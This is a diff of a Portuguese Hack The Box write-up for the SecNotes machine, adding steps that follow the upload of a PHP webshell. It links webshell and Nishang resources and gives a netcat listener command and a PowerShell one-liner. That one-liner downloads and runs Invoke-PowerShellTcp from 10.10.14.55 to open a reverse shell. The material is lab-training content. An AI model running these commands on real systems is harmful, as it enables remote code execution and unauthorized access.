@@ -160,7 +160,42 @@ Veja, a webshell nao carregava mais o arquivo de texto sim.
  
  depois de enviar uma webshell em PHP rapidamente tenho uma webshell ativa...
  
+ ***reference*** https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/9377612eeea89aed2b226a870e76ac12965d6694/easy-simple-php-webshell.php
+ 
+ https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985
+ 
 ![10.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/10.jpg)
 
+tambem usei isso como referencia https://www.microsoft.com/security/blog/2020/02/04/ghost-in-the-shell-investigating-web-shell-attacks/  
+
+ ## Reverse Shell
  
+ com um dos melhores repo que eu conheco o nishang rapidamente tenho uma rev shell em powershell
+ 
+ ***reference*** https://github.com/samratashok/nishang
+ 
+ Primeiro ative o seu web server no repo do nishang, eu sempre uso o modulo do py para agilizar por ele ser simples
+ 
+ `python -m SimplesHTTPServer 80`
+ 
+ em seguida ativo o listener na port `53`
+ 
+ `rlwrap nc -nlvp 53`
+ 
+ e entao na nossa webshell eu executo
+ 
+ ```
+ powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.55/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.55 -Port 53
+ ```
+ 
+![11.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/11.jpg)
+
+## Get User
+
+![13.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-secnotes/13.jpg)
+
+## Privilege Escalation
+
+
+
 
